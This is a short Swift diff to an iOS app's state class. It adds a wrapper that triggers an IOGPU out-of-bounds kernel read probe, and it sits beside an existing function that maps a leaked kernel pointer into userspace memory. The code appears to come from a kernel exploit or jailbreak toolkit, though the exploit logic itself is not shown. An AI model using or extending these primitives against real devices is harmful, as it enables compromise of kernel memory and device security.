@@ -157,6 +157,16 @@ final class AppState: ObservableObject {
         }
     }
 
+    /* Kernel read-out probe: point the IOGPU copy-out at a buffer we own
+       and see what the kernel writes into it. Durable log:
+       Documents/group_oob.log */
+    func groupOobRead() {
+        start {
+            nk_iogpu_group_oob_run(7)
+            return true
+        }
+    }
+
     /* Turn a leaked kernel pointer into a mapping: IOMemoryDescriptor
        GetAddress on it gives a userspace view of kernel memory. */
     func kernMap() {
